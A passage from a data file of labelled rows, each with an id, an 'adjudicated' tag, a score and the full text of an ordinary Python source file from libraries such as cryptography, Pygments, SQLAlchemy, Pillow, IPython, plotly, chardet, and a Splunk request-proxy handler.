  @classmethod<<NEWL>>    def merge_dicts(cls, *dict_args):<<NEWL>>        # Because this is annoying to do inline<<NEWL>>        outcome = {}<<NEWL>>        for d in dict_args:<<NEWL>>            outcome.update(d)<<NEWL>>        return outcome"
443	adjudicated	0	"# This file is dual licensed under the terms of the Apache License, Version<<NEWL>># 2.0, and the BSD License. See the LICENSE file in the root of this repository<<NEWL>># for complete details.<<NEWL>><<NEWL>><<NEWL>>import typing<<NEWL>><<NEWL>>from cryptography.hazmat.primitives.asymmetric import dh<<NEWL>>from cryptography.hazmat.primitives.asymmetric.types import (<<NEWL>>    PRIVATE_KEY_TYPES,<<NEWL>>    PUBLIC_KEY_TYPES,<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>def load_pem_private_key(<<NEWL>>    data: bytes,<<NEWL>>    password: typing.Optional[bytes],<<NEWL>>    backend: typing.Any = None,<<NEWL>>    *,<<NEWL>>    unsafe_skip_rsa_key_validation: bool = False,<<NEWL>>) -> PRIVATE_KEY_TYPES:<<NEWL>>    from cryptography.hazmat.backends.openssl.backend import backend as ossl<<NEWL>><<NEWL>>    return ossl.load_pem_private_key(<<NEWL>>        data, password, unsafe_skip_rsa_key_validation<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def load_pem_public_key(<<NEWL>>    data: bytes, backend: typing.Any = None<<NEWL>>) -> PUBLIC_KEY_TYPES:<<NEWL>>    from cryptography.hazmat.backends.openssl.backend import backend as ossl<<NEWL>><<NEWL>>    return ossl.load_pem_public_key(data)<<NEWL>><<NEWL>><<NEWL>>def load_pem_parameters(<<NEWL>>    data: bytes, backend: typing.Any = None<<NEWL>>) -> ""dh.DHParameters"":<<NEWL>>    from cryptography.hazmat.backends.openssl.backend import backend as ossl<<NEWL>><<NEWL>>    return ossl.load_pem_parameters(data)<<NEWL>><<NEWL>><<NEWL>>def load_der_private_key(<<NEWL>>    data: bytes,<<NEWL>>    password: typing.Optional[bytes],<<NEWL>>    backend: typing.Any = None,<<NEWL>>    *,<<NEWL>>    unsafe_skip_rsa_key_validation: bool = False,<<NEWL>>) -> PRIVATE_KEY_TYPES:<<NEWL>>    from cryptography.hazmat.backends.openssl.backend import backend as ossl<<NEWL>><<NEWL>>    return ossl.load_der_private_key(<<NEWL>>        data, password, unsafe_skip_rsa_key_validation<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def load_der_public_key(<<NEWL>>    data: bytes, backend: typing.Any = None<<NEWL>>) -> PUBLIC_KEY_TYPES:<<NEWL>>    from cryptography.hazmat.backends.openssl.backend import backend as ossl<<NEWL>><<NEWL>>    return ossl.load_der_public_key(data)<<NEWL>><<NEWL>><<NEWL>>def load_der_parameters(<<NEWL>>    data: bytes, backend: typing.Any = None<<NEWL>>) -> ""dh.DHParameters"":<<NEWL>>    from cryptography.hazmat.backends.openssl.backend import backend as ossl<<NEWL>><<NEWL>>    return ossl.load_der_parameters(data)"
484	adjudicated	1	"""""""<<NEWL>>views.py        # Houses `SchemaView`, `APIView` subclass.<<NEWL>><<NEWL>>See schemas.__init__.py for package overview.<<NEWL>>""""""<<NEWL>>from rest_framework import exceptions, renderers<<NEWL>>from rest_framework.response import Response<<NEWL>>from rest_framework.schemas import coreapi<<NEWL>>from rest_framework.settings import api_settings<<NEWL>>from rest_framework.views import APIView<<NEWL>><<NEWL>><<NEWL>>class SchemaView(APIView):<<NEWL>>    _ignore_model_permissions = True<<NEWL>>    schema = None  # exclude from schema<<NEWL>>    renderer_classes = None<<NEWL>>    schema_generator = None<<NEWL>>    public = False<<NEWL>><<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(*args, **kwargs)<<NEWL>>        if self.renderer_classes is None:<<NEWL>>            if coreapi.is_enabled():<<NEWL>>                self.renderer_classes = [<<NEWL>>                    renderers.CoreAPIOpenAPIRenderer,<<NEWL>>                    renderers.CoreJSONRenderer,<<NEWL>>                ]<<NEWL>>            else:<<NEWL>>                self.renderer_classes = [<<NEWL>>                    renderers.OpenAPIRenderer,<<NEWL>>                    renderers.JSONOpenAPIRenderer,<<NEWL>>                ]<<NEWL>>            if renderers.BrowsableAPIRenderer in api_settings.DEFAULT_RENDERER_CLASSES:<<NEWL>>                self.renderer_classes += [renderers.BrowsableAPIRenderer]<<NEWL>><<NEWL>>    def get(self, request, *args, **kwargs):<<NEWL>>        schema = self.schema_generator.get_schema(request, self.public)<<NEWL>>        if schema is None:<<NEWL>>            raise exceptions.PermissionDenied()<<NEWL>>        return Response(schema)<<NEWL>><<NEWL>>    def handle_exception(self, exc):<<NEWL>>        # Schema renderers do not render exceptions, so re-perform content<<NEWL>>        # negotiation with default renderers.<<NEWL>>        self.renderer_classes = api_settings.DEFAULT_RENDERER_CLASSES<<NEWL>>        neg = self.perform_content_negotiation(self.request, force=True)<<NEWL>>        self.request.accepted_renderer, self.request.accepted_media_type = neg<<NEWL>>        return super().handle_exception(exc)"
477	adjudicated	3	"""""""<<NEWL>>    pygments.styles.autumn<<NEWL>>    ~~~~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    A colorful style, inspired by the terminal highlighting style.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.style import Style<<NEWL>>from pygments.token import Keyword, Name, Comment, String, Error, \<<NEWL>>     Number, Operator, Generic, Whitespace<<NEWL>><<NEWL>><<NEWL>>class AutumnStyle(Style):<<NEWL>>    """"""<<NEWL>>    A colorful style, inspired by the terminal highlighting style.<<NEWL>>    """"""<<NEWL>><<NEWL>>    styles = {<<NEWL>>        Whitespace:                 '#bbbbbb',<<NEWL>><<NEWL>>        Comment:                    'italic #aaaaaa',<<NEWL>>        Comment.Preproc:            'noitalic #4c8317',<<NEWL>>        Comment.Special:            'italic #0000aa',<<NEWL>><<NEWL>>        Keyword:                    '#0000aa',<<NEWL>>        Keyword.Type:               '#00aaaa',<<NEWL>><<NEWL>>        Operator.Word:              '#0000aa',<<NEWL>><<NEWL>>        Name.Builtin:               '#00aaaa',<<NEWL>>        Name.Function:              '#00aa00',<<NEWL>>        Name.Class:                 'underline #00aa00',<<NEWL>>        Name.Namespace:             'underline #00aaaa',<<NEWL>>        Name.Variable:              '#aa0000',<<NEWL>>        Name.Constant:              '#aa0000',<<NEWL>>        Name.Entity:                'bold #800',<<NEWL>>        Name.Attribute:             '#1e90ff',<<NEWL>>        Name.Tag:                   'bold #1e90ff',<<NEWL>>        Name.Decorator:             '#888888',<<NEWL>><<NEWL>>        String:                     '#aa5500',<<NEWL>>        String.Symbol:              '#0000aa',<<NEWL>>        String.Regex:               '#009999',<<NEWL>><<NEWL>>        Number:                     '#009999',<<NEWL>><<NEWL>>        Generic.Heading:            'bold #000080',<<NEWL>>        Generic.Subheading:         'bold #800080',<<NEWL>>        Generic.Deleted:            '#aa0000',<<NEWL>>        Generic.Inserted:           '#00aa00',<<NEWL>>        Generic.Error:              '#aa0000',<<NEWL>>        Generic.Emph:               'italic',<<NEWL>>        Generic.Strong:             'bold',<<NEWL>>        Generic.Prompt:             '#555555',<<NEWL>>        Generic.Output:             '#888888',<<NEWL>>        Generic.Traceback:          '#aa0000',<<NEWL>><<NEWL>>        Error:                      '#F00 bg:#FAA'<<NEWL>>    }"
426	adjudicated	1	"""""""<<NEWL>>Aliases for functions which may be accelerated by Scipy.<<NEWL>><<NEWL>>Scipy_ can be built to use accelerated or otherwise improved libraries<<NEWL>>for FFTs, linear algebra, and special functions. This module allows<<NEWL>>developers to transparently support these accelerated functions when<<NEWL>>scipy is available but still support users who have only installed<<NEWL>>NumPy.<<NEWL>><<NEWL>>.. _Scipy : https://www.scipy.org<<NEWL>><<NEWL>>""""""<<NEWL>># This module should be used for functions both in numpy and scipy if<<NEWL>>#  you want to use the numpy version if available but the scipy version<<NEWL>>#  otherwise.<<NEWL>>#  Usage  --- from numpy.dual import fft, inv<<NEWL>><<NEWL>>__all__ = ['fft', 'ifft', 'fftn', 'ifftn', 'fft2', 'ifft2',<<NEWL>>           'norm', 'inv', 'svd', 'solve', 'det', 'eig', 'eigvals',<<NEWL>>           'eigh', 'eigvalsh', 'lstsq', 'pinv', 'cholesky', 'i0']<<NEWL>><<NEWL>>import numpy.linalg as linpkg<<NEWL>>import numpy.fft as fftpkg<<NEWL>>from numpy.lib import i0<<NEWL>>import sys<<NEWL>><<NEWL>><<NEWL>>fft = fftpkg.fft<<NEWL>>ifft = fftpkg.ifft<<NEWL>>fftn = fftpkg.fftn<<NEWL>>ifftn = fftpkg.ifftn<<NEWL>>fft2 = fftpkg.fft2<<NEWL>>ifft2 = fftpkg.ifft2<<NEWL>><<NEWL>>norm = linpkg.norm<<NEWL>>inv = linpkg.inv<<NEWL>>svd = linpkg.svd<<NEWL>>solve = linpkg.solve<<NEWL>>det = linpkg.det<<NEWL>>eig = linpkg.eig<<NEWL>>eigvals = linpkg.eigvals<<NEWL>>eigh = linpkg.eigh<<NEWL>>eigvalsh = linpkg.eigvalsh<<NEWL>>lstsq = linpkg.lstsq<<NEWL>>pinv = linpkg.pinv<<NEWL>>cholesky = linpkg.cholesky<<NEWL>><<NEWL>>_restore_dict = {}<<NEWL>><<NEWL>>def register_func(name, func):<<NEWL>>    if name not in __all__:<<NEWL>>        raise ValueError(""{} not a dual function."".format(name))<<NEWL>>    f = sys._getframe(0).f_globals<<NEWL>>    _restore_dict[name] = f[name]<<NEWL>>    f[name] = func<<NEWL>><<NEWL>>def restore_func(name):<<NEWL>>    if name not in __all__:<<NEWL>>        raise ValueError(""{} not a dual function."".format(name))<<NEWL>>    try:<<NEWL>>        val = _restore_dict[name]<<NEWL>>    except KeyError:<<NEWL>>        return<<NEWL>>    else:<<NEWL>>        sys._getframe(0).f_globals[name] = val<<NEWL>><<NEWL>>def restore_all():<<NEWL>>    for name in _restore_dict.keys():<<NEWL>>        restore_func(name)"
368	adjudicated	0	"# mssql/__init__.py<<NEWL>># Copyright (C) 2005-2023 the SQLAlchemy authors and contributors<<NEWL>># <see AUTHORS file><<NEWL>>#<<NEWL>># This module is part of SQLAlchemy and is released under<<NEWL>># the MIT License: https://www.opensource.org/licenses/mit-license.php<<NEWL>># mypy: ignore-errors<<NEWL>><<NEWL>><<NEWL>>from . import base  # noqa<<NEWL>>from . import pymssql  # noqa<<NEWL>>from . import pyodbc  # noqa<<NEWL>>from .base import BIGINT<<NEWL>>from .base import BINARY<<NEWL>>from .base import BIT<<NEWL>>from .base import CHAR<<NEWL>>from .base import DATE<<NEWL>>from .base import DATETIME<<NEWL>>from .base import DATETIME2<<NEWL>>from .base import DATETIMEOFFSET<<NEWL>>from .base import DECIMAL<<NEWL>>from .base import FLOAT<<NEWL>>from .base import IMAGE<<NEWL>>from .base import INTEGER<<NEWL>>from .base import JSON<<NEWL>>from .base import MONEY<<NEWL>>from .base import NCHAR<<NEWL>>from .base import NTEXT<<NEWL>>from .base import NUMERIC<<NEWL>>from .base import NVARCHAR<<NEWL>>from .base import REAL<<NEWL>>from .base import ROWVERSION<<NEWL>>from .base import SMALLDATETIME<<NEWL>>from .base import SMALLINT<<NEWL>>from .base import SMALLMONEY<<NEWL>>from .base import SQL_VARIANT<<NEWL>>from .base import TEXT<<NEWL>>from .base import TIME<<NEWL>>from .base import TIMESTAMP<<NEWL>>from .base import TINYINT<<NEWL>>from .base import try_cast<<NEWL>>from .base import UNIQUEIDENTIFIER<<NEWL>>from .base import VARBINARY<<NEWL>>from .base import VARCHAR<<NEWL>>from .base import XML<<NEWL>><<NEWL>><<NEWL>>base.dialect = dialect = pyodbc.dialect<<NEWL>><<NEWL>><<NEWL>>__all__ = (<<NEWL>>    ""JSON"",<<NEWL>>    ""INTEGER"",<<NEWL>>    ""BIGINT"",<<NEWL>>    ""SMALLINT"",<<NEWL>>    ""TINYINT"",<<NEWL>>    ""VARCHAR"",<<NEWL>>    ""NVARCHAR"",<<NEWL>>    ""CHAR"",<<NEWL>>    ""NCHAR"",<<NEWL>>    ""TEXT"",<<NEWL>>    ""NTEXT"",<<NEWL>>    ""DECIMAL"",<<NEWL>>    ""NUMERIC"",<<NEWL>>    ""FLOAT"",<<NEWL>>    ""DATETIME"",<<NEWL>>    ""DATETIME2"",<<NEWL>>    ""DATETIMEOFFSET"",<<NEWL>>    ""DATE"",<<NEWL>>    ""TIME"",<<NEWL>>    ""SMALLDATETIME"",<<NEWL>>    ""BINARY"",<<NEWL>>    ""VARBINARY"",<<NEWL>>    ""BIT"",<<NEWL>>    ""REAL"",<<NEWL>>    ""IMAGE"",<<NEWL>>    ""TIMESTAMP"",<<NEWL>>    ""ROWVERSION"",<<NEWL>>    ""MONEY"",<<NEWL>>    ""SMALLMONEY"",<<NEWL>>    ""UNIQUEIDENTIFIER"",<<NEWL>>    ""SQL_VARIANT"",<<NEWL>>    ""XML"",<<NEWL>>    ""dialect"",<<NEWL>>    ""try_cast"",<<NEWL>>)"
228	adjudicated	1	"""""""<<NEWL>>    pygments.lexers.x10<<NEWL>>    ~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Lexers for the X10 programming language.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.lexer import RegexLexer<<NEWL>>from pygments.token import Text, Comment, Keyword, String<<NEWL>><<NEWL>>__all__ = ['X10Lexer']<<NEWL>><<NEWL>>class X10Lexer(RegexLexer):<<NEWL>>    """"""<<NEWL>>    For the X10 language.<<NEWL>><<NEWL>>    .. versionadded:: 0.1<<NEWL>>    """"""<<NEWL>><<NEWL>>    name = 'X10'<<NEWL>>    url = 'http://x10-lang.org/'<<NEWL>>    aliases = ['x10', 'xten']<<NEWL>>    filenames = ['*.x10']<<NEWL>>    mimetypes = ['text/x-x10']<<NEWL>><<NEWL>>    keywords = (<<NEWL>>        'as', 'assert', 'async', 'at', 'athome', 'ateach', 'atomic',<<NEWL>>        'break', 'case', 'catch', 'class', 'clocked', 'continue',<<NEWL>>        'def', 'default', 'do', 'else', 'final', 'finally', 'finish',<<NEWL>>        'for', 'goto', 'haszero', 'here', 'if', 'import', 'in',<<NEWL>>        'instanceof', 'interface', 'isref', 'new', 'offer',<<NEWL>>        'operator', 'package', 'return', 'struct', 'switch', 'throw',<<NEWL>>        'try', 'type', 'val', 'var', 'when', 'while'<<NEWL>>    )<<NEWL>><<NEWL>>    types = (<<NEWL>>        'void'<<NEWL>>    )<<NEWL>><<NEWL>>    values = (<<NEWL>>        'false', 'null', 'self', 'super', 'this', 'true'<<NEWL>>    )<<NEWL>><<NEWL>>    modifiers = (<<NEWL>>        'abstract', 'extends', 'implements', 'native', 'offers',<<NEWL>>        'private', 'property', 'protected', 'public', 'static',<<NEWL>>        'throws', 'transient'<<NEWL>>    )<<NEWL>><<NEWL>>    tokens = {<<NEWL>>        'root': [<<NEWL>>            (r'[^\S\n]+', Text),<<NEWL>>            (r'//.*?\n', Comment.Single),<<NEWL>>            (r'/\*(.|\n)*?\*/', Comment.Multiline),<<NEWL>>            (r'\b(%s)\b' % '|'.join(keywords), Keyword),<<NEWL>>            (r'\b(%s)\b' % '|'.join(types), Keyword.Type),<<NEWL>>            (r'\b(%s)\b' % '|'.join(values), Keyword.Constant),<<NEWL>>            (r'\b(%s)\b' % '|'.join(modifiers), Keyword.Declaration),<<NEWL>>            (r'""(\\\\|\\[^\\]|[^""\\])*""', String),<<NEWL>>            (r""'\\.'|'[^\\]'|'\\u[0-9a-fA-F]{4}'"", String.Char),<<NEWL>>            (r'.', Text)<<NEWL>>        ],<<NEWL>>    }"
339	adjudicated	0	"from fontTools.misc.textTools import safeEval<<NEWL>>from . import DefaultTable<<NEWL>>import struct<<NEWL>><<NEWL>><<NEWL>>GASP_SYMMETRIC_GRIDFIT = 0x0004<<NEWL>>GASP_SYMMETRIC_SMOOTHING = 0x0008<<NEWL>>GASP_DOGRAY = 0x0002<<NEWL>>GASP_GRIDFIT = 0x0001<<NEWL>><<NEWL>><<NEWL>>class table__g_a_s_p(DefaultTable.DefaultTable):<<NEWL>>    def decompile(self, data, ttFont):<<NEWL>>        self.version, numRanges = struct.unpack("">HH"", data[:4])<<NEWL>>        assert 0 <= self.version <= 1, ""unknown 'gasp' format: %s"" % self.version<<NEWL>>        data = data[4:]<<NEWL>>        self.gaspRange = {}<<NEWL>>        for i in range(numRanges):<<NEWL>>            rangeMaxPPEM, rangeGaspBehavior = struct.unpack("">HH"", data[:4])<<NEWL>>            self.gaspRange[int(rangeMaxPPEM)] = int(rangeGaspBehavior)<<NEWL>>            data = data[4:]<<NEWL>>        assert not data, ""too much data""<<NEWL>><<NEWL>>    def compile(self, ttFont):<<NEWL>>        version = 0  # ignore self.version<<NEWL>>        numRanges = len(self.gaspRange)<<NEWL>>        data = b""""<<NEWL>>        items = sorted(self.gaspRange.items())<<NEWL>>        for rangeMaxPPEM, rangeGaspBehavior in items:<<NEWL>>            data = data + struct.pack("">HH"", rangeMaxPPEM, rangeGaspBehavior)<<NEWL>>            if rangeGaspBehavior & ~(GASP_GRIDFIT | GASP_DOGRAY):<<NEWL>>                version = 1<<NEWL>>        data = struct.pack("">HH"", version, numRanges) + data<<NEWL>>        return data<<NEWL>><<NEWL>>    def toXML(self, writer, ttFont):<<NEWL>>        items = sorted(self.gaspRange.items())<<NEWL>>        for rangeMaxPPEM, rangeGaspBehavior in items:<<NEWL>>            writer.simpletag(<<NEWL>>                ""gaspRange"",<<NEWL>>                [<<NEWL>>                    (""rangeMaxPPEM"", rangeMaxPPEM),<<NEWL>>                    (""rangeGaspBehavior"", rangeGaspBehavior),<<NEWL>>                ],<<NEWL>>            )<<NEWL>>            writer.newline()<<NEWL>><<NEWL>>    def fromXML(self, name, attrs, content, ttFont):<<NEWL>>        if name != ""gaspRange"":<<NEWL>>            return<<NEWL>>        if not hasattr(self, ""gaspRange""):<<NEWL>>            self.gaspRange = {}<<NEWL>>        self.gaspRange[safeEval(attrs[""rangeMaxPPEM""])] = safeEval(<<NEWL>>            attrs[""rangeGaspBehavior""]<<NEWL>>        )"
279	adjudicated	4	"""""""Pillow (Fork of the Python Imaging Library)<<NEWL>><<NEWL>>Pillow is the friendly PIL fork by Alex Clark and Contributors.<<NEWL>>    https://github.com/python-pillow/Pillow/<<NEWL>><<NEWL>>Pillow is forked from PIL 1.1.7.<<NEWL>><<NEWL>>PIL is the Python Imaging Library by Fredrik Lundh and Contributors.<<NEWL>>Copyright (c) 1999 by Secret Labs AB.<<NEWL>><<NEWL>>Use PIL.__version__ for this Pillow version.<<NEWL>><<NEWL>>;-)<<NEWL>>""""""<<NEWL>><<NEWL>>from . import _version<<NEWL>><<NEWL>># VERSION was removed in Pillow 6.0.0.<<NEWL>># PILLOW_VERSION was removed in Pillow 9.0.0.<<NEWL>># Use __version__ instead.<<NEWL>>__version__ = _version.__version__<<NEWL>>del _version<<NEWL>><<NEWL>><<NEWL>>_plugins = [<<NEWL>>    ""BlpImagePlugin"",<<NEWL>>    ""BmpImagePlugin"",<<NEWL>>    ""BufrStubImagePlugin"",<<NEWL>>    ""CurImagePlugin"",<<NEWL>>    ""DcxImagePlugin"",<<NEWL>>    ""DdsImagePlugin"",<<NEWL>>    ""EpsImagePlugin"",<<NEWL>>    ""FitsImagePlugin"",<<NEWL>>    ""FitsStubImagePlugin"",<<NEWL>>    ""FliImagePlugin"",<<NEWL>>    ""FpxImagePlugin"",<<NEWL>>    ""FtexImagePlugin"",<<NEWL>>    ""GbrImagePlugin"",<<NEWL>>    ""GifImagePlugin"",<<NEWL>>    ""GribStubImagePlugin"",<<NEWL>>    ""Hdf5StubImagePlugin"",<<NEWL>>    ""IcnsImagePlugin"",<<NEWL>>    ""IcoImagePlugin"",<<NEWL>>    ""ImImagePlugin"",<<NEWL>>    ""ImtImagePlugin"",<<NEWL>>    ""IptcImagePlugin"",<<NEWL>>    ""JpegImagePlugin"",<<NEWL>>    ""Jpeg2KImagePlugin"",<<NEWL>>    ""McIdasImagePlugin"",<<NEWL>>    ""MicImagePlugin"",<<NEWL>>    ""MpegImagePlugin"",<<NEWL>>    ""MpoImagePlugin"",<<NEWL>>    ""MspImagePlugin"",<<NEWL>>    ""PalmImagePlugin"",<<NEWL>>    ""PcdImagePlugin"",<<NEWL>>    ""PcxImagePlugin"",<<NEWL>>    ""PdfImagePlugin"",<<NEWL>>    ""PixarImagePlugin"",<<NEWL>>    ""PngImagePlugin"",<<NEWL>>    ""PpmImagePlugin"",<<NEWL>>    ""PsdImagePlugin"",<<NEWL>>    ""SgiImagePlugin"",<<NEWL>>    ""SpiderImagePlugin"",<<NEWL>>    ""SunImagePlugin"",<<NEWL>>    ""TgaImagePlugin"",<<NEWL>>    ""TiffImagePlugin"",<<NEWL>>    ""WebPImagePlugin"",<<NEWL>>    ""WmfImagePlugin"",<<NEWL>>    ""XbmImagePlugin"",<<NEWL>>    ""XpmImagePlugin"",<<NEWL>>    ""XVThumbImagePlugin"",<<NEWL>>]<<NEWL>><<NEWL>><<NEWL>>class UnidentifiedImageError(OSError):<<NEWL>>    """"""<<NEWL>>    Raised in :py:meth:`PIL.Image.open` if an image cannot be opened and identified.<<NEWL>>    """"""<<NEWL>><<NEWL>>    pass"
269	adjudicated	3	"# -*- coding: utf-8 -*-<<NEWL>>""""""Payload system for IPython.<<NEWL>><<NEWL>>Authors:<<NEWL>><<NEWL>>* Fernando Perez<<NEWL>>* Brian Granger<<NEWL>>""""""<<NEWL>><<NEWL>>#-----------------------------------------------------------------------------<<NEWL>>#       Copyright (C) 2008-2011 The IPython Development Team<<NEWL>>#<<NEWL>>#  Distributed under the terms of the BSD License.  The full license is in<<NEWL>>#  the file COPYING, distributed as part of this software.<<NEWL>>#-----------------------------------------------------------------------------<<NEWL>><<NEWL>>#-----------------------------------------------------------------------------<<NEWL>># Imports<<NEWL>>#-----------------------------------------------------------------------------<<NEWL>><<NEWL>>from traitlets.config.configurable import Configurable<<NEWL>>from traitlets import List<<NEWL>><<NEWL>>#-----------------------------------------------------------------------------<<NEWL>># Main payload class<<NEWL>>#-----------------------------------------------------------------------------<<NEWL>><<NEWL>>class PayloadManager(Configurable):<<NEWL>><<NEWL>>    _payload = List([])<<NEWL>><<NEWL>>    def write_payload(self, data, single=True):<<NEWL>>        """"""Include or update the specified `data` payload in the PayloadManager.<<NEWL>><<NEWL>>        If a previous payload with the same source exists and `single` is True,<<NEWL>>        it will be overwritten with the new one.<<NEWL>>        """"""<<NEWL>><<NEWL>>        if not isinstance(data, dict):<<NEWL>>            raise TypeError('Each payload write must be a dict, got: %r' % data)<<NEWL>><<NEWL>>        if single and 'source' in data:<<NEWL>>            source = data['source']<<NEWL>>            for i, pl in enumerate(self._payload):<<NEWL>>                if 'source' in pl and pl['source'] == source:<<NEWL>>                    self._payload[i] = data<<NEWL>>                    return<<NEWL>><<NEWL>>        self._payload.append(data)<<NEWL>><<NEWL>>    def read_payload(self):<<NEWL>>        return self._payload<<NEWL>><<NEWL>>    def clear_payload(self):<<NEWL>>        self._payload = []"
329	adjudicated	1	"from splunk.persistconn.application import PersistentServerConnectionApplication<<NEWL>>import json<<NEWL>>import requests<<NEWL>>import logging<<NEWL>><<NEWL>><<NEWL>>class request(PersistentServerConnectionApplication):<<NEWL>>    def __init__(self, command_line, command_arg, logger=None):<<NEWL>>        super(PersistentServerConnectionApplication, self).__init__()<<NEWL>>        self.logger = logger<<NEWL>>        if self.logger == None:<<NEWL>>            self.logger = logging.getLogger(f""splunk.appserver.badmsc"")<<NEWL>><<NEWL>>        PersistentServerConnectionApplication.__init__(self)<<NEWL>><<NEWL>>    def handle(self, in_string):<<NEWL>>        args = json.loads(in_string)<<NEWL>><<NEWL>>        if args[""method""] != ""POST"":<<NEWL>>            self.logger.info(f""Method {args['method']} not allowed"")<<NEWL>>            return {<<NEWL>>                ""payload"": ""Method Not Allowed"",<<NEWL>>                ""status"": 405,<<NEWL>>                ""headers"": {""Allow"": ""POST""},<<NEWL>>            }<<NEWL>><<NEWL>>        try:<<NEWL>>            options = json.loads(args[""payload""])<<NEWL>>        except Exception as e:<<NEWL>>            self.logger.info(f""Invalid payload. {e}"")<<NEWL>>            return {""payload"": ""Invalid JSON payload"", ""status"": 400}<<NEWL>><<NEWL>>        self.logger.info(args[""payload""])<<NEWL>><<NEWL>>        # Handle local requests by adding FQDN and auth token<<NEWL>>        if options[""url""].startswith(""/services""):<<NEWL>>            options[""verify""] = False<<NEWL>>            options[""url""] = f""{args['server']['rest_uri']}{options['url']}""<<NEWL>>            options[""headers""][<<NEWL>>                ""Authorization""<<NEWL>>            ] = f""Splunk {args['session']['authtoken']}""<<NEWL>>        elif not (<<NEWL>>            options[""url""].startswith(""https://"")<<NEWL>>            or options[""url""].startswith(""http://"")<<NEWL>>        ):<<NEWL>>            options[""url""] = f""https://{options['url']}""<<NEWL>><<NEWL>>        try:<<NEWL>>            r = requests.request(**options)<<NEWL>>            self.logger.info(f""{r.status_code} {r.text}"")<<NEWL>>            return {""payload"": r.text, ""status"": r.status_code}<<NEWL>>        except Exception as e:<<NEWL>>            self.logger.info(f""Request failed. {e}"")<<NEWL>>            return {""payload"": str(e), ""status"": 500}"
238	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""textfont"", parent_name=""scatterpolargl"", **kwargs):<<NEWL>>        super(TextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
378	adjudicated	0	"######################## BEGIN LICENSE BLOCK ########################<<NEWL>># The Original Code is mozilla.org code.<<NEWL>>#<<NEWL>># The Initial Developer of the Original Code is<<NEWL>># Netscape Communications Corporation.<<NEWL>># Portions created by the Initial Developer are Copyright (C) 1998<<NEWL>># the Initial Developer. All Rights Reserved.<<NEWL>>#<<NEWL>># Contributor(s):<<NEWL>>#   Mark Pilgrim - port to Python<<NEWL>>#<<NEWL>># This library is free software; you can redistribute it and/or<<NEWL>># modify it under the terms of the GNU Lesser General Public<<NEWL>># License as published by the Free Software Foundation; either<<NEWL>># version 2.1 of the License, or (at your option) any later version.<<NEWL>>#<<NEWL>># This library is distributed in the hope that it will be useful,<<NEWL>># but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU<<NEWL>># Lesser General Public License for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU Lesser General Public<<NEWL>># License along with this library; if not, write to the Free Software<<NEWL>># Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA<<NEWL>># 02110-1301  USA<<NEWL>>######################### END LICENSE BLOCK #########################<<NEWL>><<NEWL>>from .chardistribution import EUCTWDistributionAnalysis<<NEWL>>from .codingstatemachine import CodingStateMachine<<NEWL>>from .mbcharsetprober import MultiByteCharSetProber<<NEWL>>from .mbcssm import EUCTW_SM_MODEL<<NEWL>><<NEWL>><<NEWL>>class EUCTWProber(MultiByteCharSetProber):<<NEWL>>    def __init__(self) -> None:<<NEWL>>        super().__init__()<<NEWL>>        self.coding_sm = CodingStateMachine(EUCTW_SM_MODEL)<<NEWL>>        self.distribution_analyzer = EUCTWDistributionAnalysis()<<NEWL>>        self.reset()<<NEWL>><<NEWL>>    @property<<NEWL>>    def charset_name(self) -> str:<<NEWL>>        return ""EUC-TW""<<NEWL>><<NEWL>>    @property<<NEWL>>    def language(self) -> str:<<NEWL>>        return ""Taiwan"""
